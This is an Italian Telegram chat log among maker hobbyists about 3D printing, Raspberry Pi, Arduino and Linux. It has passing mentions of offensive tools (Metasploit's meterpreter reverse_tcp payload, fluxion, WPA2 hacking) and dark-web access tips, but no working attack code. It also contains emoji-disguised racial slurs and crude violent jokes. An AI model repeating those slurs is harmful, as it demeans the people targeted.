gparted non va, ho provto ad installarlo si da terminale si dallo store, ma quando lo apro mi chiede la password di admin e poi carica per un pò e si chiude
sapete come posso risolvere?
Usa parted da terminale
ok grazie mille
raga ma se ho due fili che controllano il pulsante sul telecomando io come faccio a far controllare quei due fili dal sonoff?
Non puoi
Altrimenti devi modificare la PCB
del sonoff?
Sì
ah
non posso usare i gpio?
Oppure devi aggiungere un altro relè, e la latenza aumenta
Quello non è modificare la PCB?
Sorry ma mi mother deve rompere
Il modello home secondo me, il mini rischio di scambiarlo per un krapfen e mangiarmelo
Correte tutti su Instagram nelle stories a votare! 



quello grosso più grosso per me
Che figata Kali
Lo stavo installando
Da problemi con GRUB
Non specifica perché

Ma metti Debian
Assolutamente si
Gli stavo dando un'altra possibilità
Pensando che avessi sbagliato a giudicarlo
E invece
Io ho votato Home Mini perché ha tutte le stesse funzionalità, però rompe meno le palle ad appoggiarlo in giro, costa molto meno da costruire ed è più facile stampare in 3D la parte di plastica 
Io non lo scambierei dato che non ho idea di che sia un krespern
Io voto vecchio cell dentro scatola in cartone
Up soprattutto per la questione spazio
Da me si chiamano Bomboloni.. già se li chiami frati ti guardano male
Correte tutti su Instagram nelle stories a votare! 



Ma col Raspberry non va solo in inglese e per un numero limitato di richieste al giorno? O non mi sono aggiornato?
Da me i bomboloni sono alla crema e i krapfen alla marmellata, ma contando che li compro al lidl è probabile in realtà siano fatti di aspartame
Nel bresciano li chiamiamo bomboloni se sono alla crema e krapfen se sono con la marmellata... Ci complichiamo la vita per nulla
Ollè
AHAHA
Di dove sei?
Stato indipendente di Arso
MMMMMMMHHHHHHHHH non credo 🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔
Aka veneto
Vicini di casa
Dove?
Appena controllato, sì e il Pi Zero W non supporta molte feature tra cui la hotword "Ok, Google"

Però l'italiano ora è supportato
Di dove sei?
Brescia
Mmh un Pi3 riusciamo a infilarlo anche nell'home mini se si stringono... Ma quella dell'inglese mi è abbastanza nuova 🤔
l'Italiano l'hanno aggiunto il primo marzo
Ho appena controllato il changelog
A me da quest'errore durante l'installazione di zipalign. Come posso risolvere? 
Hai scritto male il nome
Oppure devi dare sudo apt update
Non va lo stesso
Let me 
 that for you:
 

Non va con il comando 'sudo apt-get install zipalign' che è quello usato su tutte le guide
Hai scritto il nome bene?
Si
Allora prova a cercare il file pulito di /etc/apt/sources.list su internet e sostituirlo con il tuo
Come lo faccio?
Mmh
Consigli?
Ahh ecco... Da me proprio non esistono con la marmellata

Vado di Gnome?
O Cinnamon?
Xfce
Usa troppa ram

Se hai 16Gb va pure bene
Anche 8
Nop rip
Vado di xfce?
Si, è ottimo come DE
Quindi spunto xfce e rimuovo "ambiente desktop Debian"?
Server di stampa cosa aggiunge?
Yep
CUPS immagino
Teoricamente, rimuovendolo, è tutto più leggero
Ambiente Desktop Debian è Gnome
L'ho rimosso
Ho lasciato solo xfce
Daje che mi esplode il pc hahahahahha
siii, ma se è fatto con rpi 3 almeno è multitasking, lo puoi usare come nas e mille altre cose nel mentre che fa da home
Ma cosa può fare in più il google home rispetto ad un cell?
Quando un libro di filosofia prova a spiegare il piano cartesiano...
Ragazzi, domanda stupida:
Le guest addition per virtualbox, le devo installare sul sistema virtualizzato o sul sistema "reale"
Virtualizzato
E devo scaricare quelle per windows o linux? (Quando il sistema virtualizzato è linux)
Linux
Ultima domanda che probabilmente avrò già fatto
Sei l'admin della page di instagram?
Yep
Oh, figo hahahah
Ma è più scarso
Come forma ci sta di più però
Eddai fatelo con un vecchio cell dentro una scatola di cartone coi fori
Thank you for the support, Russia! This could become a Sunday tradition. Please don’t forget to clean up ✈️
Aerei di carta dappertutto in Russia contro il ban di telegram
Grande durov
Ma che teneri
 l'acgom ha detto che girada é legale
Ahh Girada, guarda questo e po... ah aspe
A quanto pare il loro modello di business é abbastanza solido
cit.
Ushh
ma che caaaaaaaaa
Ci sono rimasto male anche io lol
Girada e' sempre stato legale e cancro
no più che altro non capisco...i conti non tornano, letteralmente
Bo
E' come Ponzi ma non del tutto
Ma è legale
Si ma cazzo, comunque per 4 persone che pagano viene acquistato un prodotto
Solo che ti fotte
Cioè...
si infatti, voglio dire, tu puoi raggirarmi con tutte le cagate che vuoi a riguardo ma rimane il fatto che tu paghi 1/3 di quel che dovevi e i 2/3 poi non spariscono magicamente
c'è, matematica cribbio
Finché compri roba a poco va bene
si beh, in realtà no, comunque non ci tengo ad aspettare 2 anni perchè mi arrivi qualsiasi cosa
È una tua scelta
Liste lol
si beh ormai i tempi sono quelli
Btw non comprerò mai niente da girada
h
Mmm ma non ne sei consapevole
È un test
Per il case come fai? Stampa 3d? Oppure una cosa alla meno peggio?
i
case in 3d con del tessuto a coprire la parte superiore
Inferiore
Non ho capito
Ahhh quindi fai quello grande?
Su Instagram sta vincendo quello 
Ciao, qualcuno mi può aiutare com mechanize?
(Python)
Io ho ordinato quello piccolo
a me stai facendo venire voglia di costruirlo anche se alla fine non saprei cosa farmene, certo è che sarebbe davvero figo fondere i comandi vocali con gli emulatori, tipo "ok google avvia tekken"

ma 
HAHAHAAHAHHAHAHA
Mi veniva voglia anche a me di prenderlo, ho anche 7€ di sconto... Però a costruirlo ho tipo 40€ di sconto 
ma conti di ottenere lo stesso risultato? a livello di prestazioni intendo
cioè magari esiste già tutto online
Nono, meglio ovviamente
ecco, adesso ho l'hype, gg.
Conto di usarlo anche come NAS, o come server musicale, o server domotico, o tutti assieme


PSS passami il codice sconto
Basta fare clickbait:c (scherzo)
ahahah
Quando devi reinstallare Windows 8.1 perché il tuo computer non reggeva Windows 10 al 100%
Ma poi ci ripensi e metti Debian
Quello borse
"android devi riavviarlo ogni settimana o si impalla"
Unix ma te celai perché
Ragazzi qualcuno ha esp8266 mi potrebbe aiutare con un problema?
Conosco gente che ha tenuto un anno un cell senza riavviarlo e spengerlo (tasto di accensione rottol
Ahahahah
(ovviamente se lo spegni non riparte più)
Io lo riavvio una volta al mese perché mi diventa troppo lento il telefono
Io tutte le mattine
La fase che dura un eternità
La fase di cui non ci importa niente
Federico questa battuta mi è piaciuta e ti do 10
Hahaha
Mi sapreste trovare una guida dettagliata ma semplice su come entrare nel deepweb
?
Installa tor avvialo , cerca la hidden wiki su Google e divertiti
Cosa è la hidden wiki ?
Una lista di siti con tanta roba brutta
Tip: non comprare niente
MI PIACE LA ROBA BRUTTA
Non mi interessa drogarmi avere armi, o schiavi xD
Non guardare pedopornografia o vengo a casetta tua a staccarti la testa :D
Manco quello voglio fare hahaahaa
O il cavo di rete, dipende
Oppure gli occhi :D

o il volatile
O l’apparato maschile
(si c'è l'ho con i pedofili)
capiscila
🦅
era il modo più raffinato per dirlo
Il mio più scientifico 
Oppure il cazzo
Andiamo direttamente al nocciolo
Bravo
Come la crittografia a strati di The Onion Router

Kkk
Io vado a nanna
Nootteh
QUALCUNO LA HA CAPITA
io pureeee
Ah no è credito di Google Play Rewards
Diesci
Spe che mi sono perso??
Ehm
Domenica, ore 23:00. Cieco come sono senza occhiali sto cercando di saldare gli occhiali per farli resistere il tempo di raggiungere un ottico. La situazione è disperata.
Non va
Per me si fonde la lente xD
Vai di Attack e occhio alle lenti che si ossidano tantiasimo
Salve! Stavo dando un occhiata alle reflex low cost... Ma una canon 1300D é consigliabile? O è addirittura insensato spendere 400 euro per una reflex?
Vai di lenti a contatto
raga come mai arduino mircro se gli do il comando ad esempio:
Keyboard.print("
");
mi scrive altri caratteri?
come risolvo?
ma stampare la montatura in 3d?
Quando hai la miopia a 500 gradi per 20 anni di vita davanti ad un monitor
Domenica, ore 23:00. Cieco come sono senza occhiali sto cercando di saldare gli occhiali per farli resistere il tempo di raggiungere un ottico. La situazione è disperata.
Non so se sia da ignOHMranza o no 🤔
È insensato prendere nuovo se hai poco budget secondo me
Lo è
Perchè per i caratteri speciali come : e / ci vogliono proprio le shortcut di Windows
Ma poi quando va dall'ottico e vede la lente mezza sciolta saldata malissimo
Come Shift + . per i :
Più che altro 400 euro è l'ipotetico budeget per un regalo e "una reflex" potrebbe essere la risposta alla domanda "cosa vorresti"
Azz...foto, video o foto/video?
Io lascerei perdere
Ma neanche un body e poi mi prendo l'obiettivo?
La Instagram story della battaglia tra mini e fullsize
Il minimo che spendi per l'obbiettivo sarebbero 200€ vedi tu
Ma gli occhiali?
Ma un po' di semplice Attack?
Come corpo puoi prendere un più decente 700d o A6000 in offerta
A quanto pare il titanio è repellente allo stagno, provo con la chimica
Ora do un'occhiata...ma in generale sono articoli che si prendono su amazon o ci sono siti specializzati?
Ma lascia perdere, metti le lenti a contatto... E le lenti le sposti su un'altra montatura
Dovrei rifare tutto in realtà, anche le lenti
Comunque nemmeno io ho occhiali di riserva, brutti momenti quando succedono queste cose
Un maker come te senza colla bicomponente??
Mica è rulof
Su eglobal trovi prezzi migliori ma sono molto più lenti
 pensa che ne verrebbe fuori...
Una cosa che non utilizzerei
aok
Ma la 700d è ancora prodotta?
A quella cifra sono meglio le bridge...
Come avrai capito chiaramente non sono un esperto...ma le bridge non hanno un uso molto diverso dalle reflex?
La ho la ho
Meglio una colla universale o un bicomponente epossidico?
"Usiamo un po' di SUPERCOLLA TTAKE (COMPRATELA CHE SENNÒ NON GUADAGNO) su questo oggetti che proprio non aveva bisogno di colla"

Secondo me universale dovrebbe andare bene per tutto senza incasinarsi troppoa vita 
Secondo me non attaccano nemmeno queste...
Poi dipende se deve resistere per 1/2 giorni o 1/2 mesi prima di vedere l'ottico
Il bicomponente sicuro sì, ma puzza da caimano e qui tra mezz'ora ci devo dormire
Il titanio fa un ossido molto refrattario... Non ci si attacca niente
Finestra aperta, da me si sono 25 gradi
come
Cianoacrilato 1 - resine ipossidiche 0
La disfida delle colle 
Sicuro è venduta
Lo stagno credo resista più della colla bicomponente.
Due lustri fa avevo un paio di occhiali che richiedevano saltuariamente di una saldatura.
Dopo un anno di saldature una lente si era deformata dal calore applicato.
Forse il miglior risultato lo puoi ottenere con un trafo di hoven mw a mo di puntatrice
Invece era proprio refrattario, come se stessi cercando di saldarlo con gocciole di mercurio
La Colla epossidica bicomponente incolla tutto...
Si ma ^ ☺️
comunque, guardando in giro mi sa che non c'è il case stile google home per il raspberry
Ma infatti marco lo voleva progettare lui
Tutto da zero
Da come ho capito io almeno
cavolo, allora dovrà farli entrambi 
Non sembra così impossibile
non è impossibile, ma è uno sbattimento, soprattutto vedendo che online nessuno ha mosso il culo per farlo
Intanto mi sono ricordato che ho lezione fra mezz'ora e sono ancora a letto
No infatti
E io ho appena scoperto che forse non ho lezione tra mezz'ora ma sono già fuori dal letto 
Sempre procastinare
Tanto te la fanno recuperare🤣
Già
E tanto non vado 
è molto semplice, ne prendi uno su amazon fai tutte le foto e con il programma della autodesk di cui nom ricordo il nome crei il modello 3d a partire da esse poi fai il reso
Comunque, guardando come funziona il Google home direi che la parte più difficile sia l'avere il touch nella parte superiore insieme ai led
Sensore di prossimità
Uhm... Non so
Tanto quello un tap deve prendere
Quello grande ha proprio il touch per alzare e abbassare il volume in maniera più figa 
E fai col sensore di prossimità
Lo regoli allontanando la mano in verticale
volendo 
se no c'è il sensore touch capacitivo
WINGONEER Fai da te 5PCS TTP223B capacitivo sensore digitale touch Switch Module per Arduino 
È un cilindro... Basta un calibro
il problema è che questo funziona da pulsante e non ha una griglia per la posizione
probabilmente la soluzione sarà quella di disegnarsi il circuito e aggirare il problema così
Altrimenti usi 3 di quelli
Uno per il volume+, uno per il volume- e uno per il play/pausa/triggerare l'assistente vocale
bannalo
Wtf
Ma lo ridevo reinstallare da chiavetta
Di nuovo
esatto, quello cge pensavo io o se no si può fare un pcb  apposta con i sensori ma è piu complicato e costoso
ma sarebbe più figo come risultato
secondo me, fatto un buon lavoro, si potrebbero ottenere ottime soddisfazioni
Odddioh ma la mano ha già  l'intelligenza artificiale GG guys.esco dal gruppo finche non sono diventato la terza mano
Questa è la "terza mano"
Meno male che non è "la gamba della giustizia"
Sai i pedatoni?
Miii
Qualcuno riesce ad aiutarmi con grub2 che ho fatto un casino
Eh?
Come posso calcolare quanto occuperà un video con una classica ip cam?
Oh romboli, mi devo ricredere, il video mi è piaciuto
Ahahahahahahah
Risoluzione + formato + durata? Ma ti direi prova e vedi
Lo ha detto un amico in un altto gruppo
Hahahaha
🤔che tastiera è? la Anne Pro?
 tzè, dilettante..this is Terza Mano Seria
weeila... manina?
Per 
  che ride a vedere i floppy da 3,5 pollici gli mando una foto di un floppy da 8 pollici, per una capacita di 256 kb.
Ecco questi sono troppo giovane
Ancora lì tengo con il commodore 128
Non credo, saranno da 5" 1/4
dr. octopus
li ho visti anni fa in una puntata di White Collar
già..comodissima se la sai modificare per montarci una ventola più grossa con filtro a carboni attivi
sapete se posso aprire una chat con una persona su telegram conoscendo solo il chatid?
come succede com 
@ usinfobot <ID>
ma quella persona non ha un username 
Puoi metterlo nell’href di un link se usi HTML e cambiare il nome che si vede
🤨🤨🤨
thanks comunque, chi lo sapeva 
Però il dispositivo che clicca deve avere Telegram
ma perchè non va più 

Brava Mano ❤️
Intendevo l’href mandato su telegram quando formatti il messaggio come HTML
ma quanto sei brava 
è solo per Telegram X?
non capisco perchè lo prende come link ma non lo apre
(anche cambiando ID)
Dovrebbe andare con tutto, te lo apre con l’applicazione predefinita
Cooooosaaa
sei troppo giovane
Raga... Dove posso trovare questi precisi switch... Non trovo il modelo giusto
🤔aliexpress oppure banggood?
Si ma non trovo il modello preciso dello switch
Sembrano davvero piccoli
🤔boh..senza codice è molto difficile
Il modello mi sembra sia "switchbrutti"
Ci starebbe come modello... Gli dai un colpetto e si spaccano...
scusate vorrei usare il mio raspberry con fluxion SET msf e robe di questo tipo che distro mi consigliate?
Non saprei, Kali pesa troppo?
1) si 
2) già provato ho installato msf e non trovava android/meterpreter/reverse_tcp
3) non ci va nulla ogni cosa si riempie la sd
Suicide os
...
aaa che dolore
com'è possibile che non sia ancora caduto
Buona idea
Perche dovrebbe
perchè la gravità esiste
e io stampo sempre abs, con quello c'è da fare attenzione a simili cose
Infatti nn e caduto
il socio di arco
Abs quanti gradi lavora?
250 + 100 di solito io
Con quello estrusore oppure hai cambiato?
quello
beh arriva senza problemi anche a temperature molto più alte
Hai qualche stapa da mostrare?
Voglio vedere sé ho settata bene
Tipo lui?
By Pietro, fornitore ufficiale

By Lucian, fornitore ufficiale

By Lucian, fornitore ufficiale

By Lucian, fornitore ufficiale

Lol
a me abs non attacca 
beh se usi abs usa 250° + 100° e poi il resto dei settaggi sono di tua scelta, dipendono dalla precisione che vuoi e il tempo che ci deve mettere e cose così, le velocità io ho messo un 40 mm/s e di spostamenti 130 mm/s
o meglio attacca quando i pezzi sono piccoli
come a tutti...
ed è sempre una roulette
invece con petg e pla zero problemi
Piu piccolo nn hai niente?.nn riesco a vedere la qualità, qullo quante ore ci sono volute?
mai staccato
fai un po' di abs juice ed è finita no?
TANTE
ma infatti pensavo
non è meglio un altro filamento invece dell'abs? 
ho tipo documentato tutto per 1 giornata intera qua sul gruppo
tra un po' dovrò stampare il drone ma di farlo in petg non mi va
noh, l'abs è fottutamente indistruttibile, il pla ti cade a terra si spezza come niente
usa l'abs, fidati, è mooolto resistente per queste cose, io l'ho fatto con un 50% di riempimento di tutto, poi le placche sopra e sotto 100%, in realtà quella sotto la devo tipo ristampare perchè per sbaglio l'avevo fatta 0% per dirti
 hai fatto dei upgrade?
mannaggia 
io ragazzi sto abs lo odio
2 blocchetti per tenere fermi i 2 "z", poi basta
considerate che sto facendo una console portatile tipo gameboy
per stampare tutto ci sto mettendo 2 settimane
ogni volta mi si stacca qualcosa
è bellixximooo
no
quando usi il petg o pla è tutto più bello
Quali sono?
ma...ma....ma, cosa c'è che non va
perché attacca immediatamente
usa abs juiceeee
non attacca :(
dopo provo
ma ho provato una lacca fatta apposta
hotbed
ovvio che non attacca, manco a me attacca senza
quelle sono inutili
ho ridotto la distanza dal nozzle al piatto per aumentare l'adesione
messo un brim infinito
non andare a comprare roba in più di inutile, un po' di acetone puro 100% e un po' di abs, lo mescoli e lasci li per 10 minuti, poi, lo puoi usare, mettici tanto abs per farlo abbastanza denso, poi io ho sempre problemi a staccare la roba, devi andarci di prepotenza con una paletta a botte
non serveee
mmm
vabbè dai
c'è, la distanza deve essere molto poca, si, ma poi non è che attacchi di più
tanto di abs stampato male ne ho tantissimo
ma una volta fatto il mix lo posso usare quando mi pare no?
si, basta che sia chiuso ermeticamente perchè fa il residuo, se non è ben chiuso tutto l'acetone ti evapora in camera e rimani con un blocco instaccabile di abs e i polmoni sciolti
e magari prima di usarlo mescola per bene
si si ovviamente chiudo bene
ma tanto sta tutto in officina
va bene dai
stasera ci provo
Vedi? Sto qua è qui da un casino tra l'altro, comunque non te ne serve molto in realtà, il giusto per coprire la zona dove viene stampato il pezzo
per completezza di informazioni
sto facendo questo 
ho fatto tutta la parte elettronica, manca solo la parte da stampare in 3d
ahhh quindi poco
sono curioso guarda
Prova Ubuntu Mate
grazie ora provo
si e poi, sta tranquillo, di solito i primi 2 layer non tacca molto, dopo inizia a prendere e da quando ha iniziato a taccare non si stacca più, se lo vedi che si stacca e riattacca allora devi aumentare il flow, io lo tengo sempre per sicurezza al 105%, ma senza esagerare altrimenti succede che si sovrappongono i layer e si rovina tutto
cmq, acetone 100% non quello delle unghie, mi raccomando
si si lo ho l'acetone 100%
io ho messo sempre al 95% il flow invece
non avevo pensato di aumentarlo sopra il 100%
ecco, mettilo su almeno 100
Il flow serve per rendere perfetto lo spessore di una linea
Ciao Giulio
Bisogna rispettare l'ambiente
però pesa 5GB la mia sd è da 8  vabbeh ci provo
Prova essential os
(tranne se si sta parlando di rasph)
si sto parlando del pi3
Mettici quello di default rasph (non mi ricordo il nome ri🅱)
raspbian intendi? si è buono ma non stretch, è pieno di problemi, io ci vado di jessie
Sih
Sennò u🅱untu server
Mi piace tro🅱🅱o scrivere così
Qualcuno qua ha mai costruito un orologio a tubi nixie?
Sarei parecchio interessato
E poi le stampe vengono male
se sali sopra il 105% di flow dici?
lo volevo fare tantissimissimo iooo
p.s. amo le cose vintage
Già  costano uno scatafascio
Uguale
ed ecco cosa mi ha fermato
Se lo imposti a caso
🅱ello
Anche perché vanno alimentati a 170v
E quindi pure i kit senza i tubi costano di base
beh ovvio
Così tanto ?!
no beh, per quello non è un problema, io invece che usare un trasformatore userei direttamente il mega power coso di mio zio che è identico a quello di electroboom ma bianco invece che rosso e tiene fino a 250V di tensione
E è un parametro che va calibrato per arrivare alla larghezza della linea desiderata
devi infiammare il gas, è l'unica, beh le valvole normali anche 400V tranquillissimi eh
Eh sì peccato che devi fornire 170v a tutti i nixie , piedino per piedino
Servono dei driver appositi
ssshhh
E poi spesso i datasheet sono in russo 🤬
Cyka 🅱lyet
beh basta che uso due cavi di corrente in entrata e poi diramo, non dovrebbe dare problemi se per quello, è più tutto il "come far andare l'orologio"
 tu che seu esperto com'è sta stampa?
La nuova ,🅱odafone station é 🅱ellissima !
La scatola é wow
WTF? Come faccio a saperle io le visualizzazioni?
 molto inaccurato
  ti sta chiedendo se ti torna il conto con il bot visualizzazioni e con le visualizzazioni che hai pagato dalla visualizzantion farm
Qualcuno bravo in Photoshop?
Sono disposto pure a cacciare money
Ah allora no
Perché di solito ne pago 200.000 a video
ci ho messo 10 minuti per capirla
Ahahahahah
chi si diverte a taggarmi e poi eliminare il messaggio?
apro telegram e vedo il tag nel gruppo, entro e non c'è nulla
Ri🅱
Meme Lord
Ey ni🅱🅱a per chi mi hai preso ?
Vai cosa ti serve
una vespa
devo pitturare una scocca
Rly? Wat r u talkin 🅱out?
Ur mom gay
Ur dad les🅱ian
Fuck

wow
Te lo posso fare domani, mandami la foto
In privato
si
Mi linkate un monitor su amazon che sia il più piccolo possibile?
K ni🅱🅱a
?
5 pollici van bene ?
Vuol dire ok niggq
I see you're a memer of culture as well
Ma quanti mamer in questo gru🅱🅱o
другу нужна человеческая плоть
ragazzi qualcuno che se ne intenda di Plex?
So flexare ma non penso c'entri
gia
🅱an
al mio amico / a quell'altro serve 
 plot...che boh, mai sentito cosa voglia dire manco lui
0,5" ??
Per Arduino
 le visual di schrodinger, sono sia ottime che indecenti
WTF? Come faccio a saperle io le visualizzazioni?
Si
Magari con l'hdmi
eh? eeeeeeeeeehhhhhhhhhhh?
Che ci devo attaccare il rasp
madonna
il rasp non si collega al wifi
peggio di twitter che appena pubblichi qualcosa spara 34 visualizzazioni anche se non ti conosce nessuno
chi sa aiutarmi?
è un pi3? 
si
Ahah psicologia inversa
Perchè una volta uno mi stava spammando in privato che non gli partiva il wifi del rasp e alla fine si è scoperto che era un pi2 .-.
yeeeeeeeeeeeeeeeeeeeee
Ma non è OO :(
che poverata
comunque per fare i movimenti tipo in diagonale voi come fareste? io pensavo che magari usando i thread sarebbe fattibile ma di solito come si fa senza stuprare i thread?
anche perchè non credo che ogni gioco esistente richieda 99 thread ._.
è un cavolata .-.
*il mio li richiederà ovviamente*
how?
asp
l'avevo fatto ma poi l'ho levato perchè quello dovrebbe essere snake

Richiami un metodo che lo sposta di 1 pixel in alto e 1 a destra
ah sì, devi handlare anche i key up
che tristezza
c'è ok, si, però pensavo ci fossero metodi più sofisticati
.-.
giustamente, nel dubbio if su ogni cosa
How to check if x is 0



by 
Quando si dice complessità esponenziale
la seconda ci sta
Ma anche no
raga
come cambio lingua ad assistant sul rasp?
non credo sia uscito assistant in italiano
(le api intendo)
la prima è un sogno irraggiungibile
HAHA YES



by 
nessuno 🤔
+1
l'ultima invece è anchessa un altro sogno irraggiungibile ma di uno disperato però
se il sonoff non si connette più al wifi cosa faccio?(ha su tasmota)
Quali motori mi consigliate per una macchina controllata da Arduino? Vorrei puntare sulla velocità, da corsa praticamente
^
Sembra questo ?

È in demo 
Come faccio a installarlo?
È kali
Riavvia la USB e clicca su installa
Oppure c'è un pulsante
E ho la USB attaccata
Scollega e ricollega
Già fatto piú volte
Un dvd dal cinese lo pago 50 centesimi
Verissimo
dei brushless di sicuro, per i kv devi vedere il diam. della ruota il rapporto di trasmissione e il voltaggio della batteria ma comunque ci sono dei calcolatori
Come faccio a far rimanere accesa la corrente sulle usb del mio portatile anche quando é chiuso(non spento)?
Impostazioni di risparmio energia avanzate (su Windows)
Ora non sono al PC ma li c'è l'impostazione
Sotto il nome di?
Pannello di controllo
Hardware e suoni
Opzioni risparmio energia
Modifica impostazioni combinazione
Cambia impostazioni avanzate risparmio energia

Però ora noto che lì non parla di USB a schermo chiuso. 🤔

Proverei a vedere anche sul BIOS.
Questo è un errore molto comune che ho riscontrato anche io su YouTube c'è la soluzione, (non più di 5 minuti)
Vai a casa di ogni iscritto, vedi la cronologia () e conti le visual, semplice 
WTF? Come faccio a saperle io le visualizzazioni?
Buonasera , volevo chiedere un informazione per L associazione di un bot per ifttt, ho notato che hanno rimosso il maker , bisogna per forza usare il bot di ifttt per condividere le funzioni su un gruppo Telegram o c è qualche altro modo ?
Nop
C'è una funzione simile
Aspé xhe controllo
Breve storia triste:
Voglio fare il pro, scaricando Debian ed installando metasploit
Non ci riesco
Hackerman
C'è metasploit per windows
In realtà voglio imparare un po' l'ambiente linux
Da quanto 
 ha fatto il video l'utilizzo di Linux in Italia è aumentato del 300%
E volevo scaricare metasploit but rip
Oh yes
Over-influencer
Sera
Ultimi upgrade!
Manca solo il tasto in/off, domani lo disegno e stampo
Ma che belessssa
 rispetto a facebook le visualizzazioni sono almeno molto poco gonfiate
WTF? Come faccio a saperle io le visualizzazioni?
Avevi tempo da buttare?
Xche
Quanto ci hai messo?
Quanto lo userai?
Sono un pilota di droni
E il mio lavoro
Ci ho messo circa una decina di ore tra progettazione e realizzazione
Più le ore per stampare i pezzi necessari all'assemblaggio
*è
Grazie
Di niente
È possibile fare un bot di telegram su un nodeMCU?
Può fare richieste http?
Credo di si stavo facendo delle ricerche
Se si, ci puoi fare un bot
webhooks
ora si chiama così
semplice 
come con le rubberducky hahahah
Come con le biciclette sgarruppate🤔
Looool
lo attacchi a un drone quel bestione?
Ahahahahahahah
Cambridge Analytica, Aleksandr Kogan ha chiesto scusa e attaccato Facebook


troppo facile
Si troppo facile e rimangono sempre zone d'ombra. È strano questo mondo dove la deontologia arriva scoppio  ritardato. Ci deve essere sempre qualcuno che ti deve dire cosa è corretto e cosa no. Di fronte ai soldi tutto diventa lecito.... mahh
Sempre su ifttt?
Yea 🅱oi
Marco influencer 2.0
A me si bugga quando mi tagga la mano
La tua sorellina
E anche tu
Ora mi hai buggato tu
No quello è manuale. Ma la parte motorizzata si sgancia e si aggancia al drone
ah ok divevo che era un po' grande
sisi
"how to hack wpa2"
non siamo armeni noi hahahaha 
.
Hai risolto? Perché ho lo stesso identico problema🤨
raga ho trovato un prog che ottimiza il video,da 2 GB puo diventare 500mb
da 4K diventa 480p
eh XD nel vid dice che non cambia la qualita devo provarlo ancora
ah vab ho scoperto che quel prog ottimiza solo i imaggini (facepalm)
Beh dai frame per frame... 🤣

raga ce un prog che aggiunge dei commandi nel cmq e che lo trasforma ad un terminale simile a quello di linux 
Usare la "nuova" Power Shell?
Anche se il cmd è così adorabile...
bo il prog si chiama ConEmu  voglio provare sti prog che ho trovato nel internet perche come ho capito velocizzano il lavoro per un bel po
ecco un esempio,apre l'immagine molto velocamente,a differenza di windows, che lo apre entro 2 ore 
 hai trovato una soluzione?
Raga ho creato un radar con arduino, utilizzando uno progetto già fatto; come potrei aggiungere un suono che a seconda della distanza cambia intensità?
Però senza buzzer, ma tramite l'audio del pc


Stampantina 3D senza troppe pretese – 68
 76%

Xiaomi Amazfit Smartwatch 2 – 14
 16%

Gimbal per il drone – 8
 9%

 90 people voted so far.
Anet a8ooo
Tutorial su come accendere un fuoco
Secondo me potrebbe prendersi anche una creality, ho visto gente con meno iscritti recensire roba molto più costosa
La cr10 non sarebbe così male si
Anche
"mi ha preso fuoco casa" sai quante visual
 quando uscirà il video di google home?
funziona, è bella, ti soffochi di abs, cosa vuoi di più?
bravo ù-ù
Deve prima arrivarmi la roba bro 
io mi sono appena accorto di una cosa, appena accendo il saldatore la radio smette di funzionare, senti tipo rumore di sottofondo su ogni frequenza
almeno in FM, dovrei provare con AM, ma dovrebbe essere uguale mi sa
Interferenza elettrica
Certo mi pare un po' strano
Però è l'unica spiegazione
già
Cosa?
Speaker, microfono, tessuto...
????
Qualcuno ha una buona guida per usare un esp8266 nodemcu?
Forse evan kale ti può aiutare
Ah
Scherzone
Usa la cicalina compresa, non ti saprei dire
?
Buon pomeriggio ragazzi, che programma mi consigliate per cominciare a progettare pezzi da stampare in 3d? Magari avete anche qualche guida?
Fusion 360
Ne ho presi 2 ma sul Huawei Mate S non vanno.

 ‎€1‎3.‎67‎ i‎nv‎ec‎e ‎ch‎e ‎€2‎3.‎94
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎2.‎90%
⭐️‎ 4‎.9‎0 ‌‎/‌‎ ‎5.‎00‎ (‎22‎73‎ r‎ec‎en‎si‎on‎i)
 Store: Banggood
 

Ha i driver?
Ho scaricato diverse App senza successo
Grazie, hai qualche guida?
No, però è molto intuitivo se sai usare AutoCAD


Questa all'avvio ti dice se hai o meno i driver
sul canale telegram di overVolt c'era un app per vedere se funziona
Qualcuno mi consiglia un buon sito per comprare key di Windows tipo kinguing
?


Impronta digitale – 15
 79%

Sblocco facciale – 4
 21%

 19 people voted so far.
Meglio in che senso?
"dipende" è la risposta corretta

Sicurezza e praticità
 per caso riusciresti ad aiutarmi?
Si ma non mi ricordo più.
Dovrei andare a cercarla
Blender
Dopo forse, ora dono via, stasera se vuoi
Tre che culo
Yee
madò
sei nel programma Windows Insider?
Perché nel 2015 quando ero un Insider avevo più o meno un problema del genere al giorno, poi appena è uscita la prima build stabile di Windows 10 sono uscito dal programma.
Sisi già lo uso un po'
Nn o kpt sks
Che c'entra un video dell'OP-1? 
In classe abbiamo costruito una versione povera dell'Atari Synth Punk e il suono ci sembrava simile all'intro di One
Install linux
Ah gg
raga un mio parente,che e piuttosto ingamba,ha detto che sapendo il css,html e javascript e riuscito a trovare il login e il password di un ragazzo in un social network famoso,russo(e cmq ha veramente fatto quella cosa,cerano delle persone che hanno visto). Mi chiedo,come lo ha fatto? cioe un social network famoso non deve essere protetto bene? mi chiedo sempre ma non trovo mai una risposta adatta .-.
Il solito "cugino" che fa le cose aggratis 

Esci i link
Vero, quando sono a casa vi faccio la lista così potete prendere la roba in anticipo
Beh dipende dal contesto, se uno mentre fa il login con facebook lascia lì username e password senza loggare basta modificare anche solo l'html
Poi non ti saprei dire ma sicuramente con il css non fai nulla
Fantastico!! Grazie !!
fai...beh intanto il valore della distanza tu lo puoi prendere giusto? allora attaccagli una cassa per esempio, metti negativo su gnd e positivo su un pin e poi usi quel pin per sparargli un segnale a frequenza = distanza in metri/centimetri * 1000 facendo direttamente un while(true){
DigitalWrite pin(HIGH);
delay((1/(distanza*1000))
);
DigitalWrite pin(LOW);
delay((1/(distanza*1000))
);
}
Non si potrebbe usare l’audio del pc?
noh, non puoi da arduino
a meno che non fai un codice sul pc che usi l'audio del pc e gli fai prendere segnali dai pin tx e rx e dall'arduino invii un segnale tipo un numero che è la distanza
in quel caso...beh, non ho idea di come usare l'audio del pc da alcun linguaggio di programmazione io
Qualcuno mi può dare dei consigli per una radio da mettere in un ape?
Uh bella sta funzione
Raga stavo aiutando un mio amico a montare un PC...
Lo abbiamo finito, ma non funziona, ce non si accende...
Avete dei consigli?
Ape a 3 ruote? Si sbilancia 

Comunque dovresti cambiare batteria, quella dei motorini è tipo 4 Ah
La scarichi subito
Ignoranza pura 
Linux 

Non parte l'alimentazione non si illumina...

Provo a vedere se è l'alimentatore...
Se vi riscrivo non è quello se non riscrivo era quello e ho risolto...
Qualcuno lo può togliere? 
Ora metto in difficoltà la mano 
È troppo intelligente
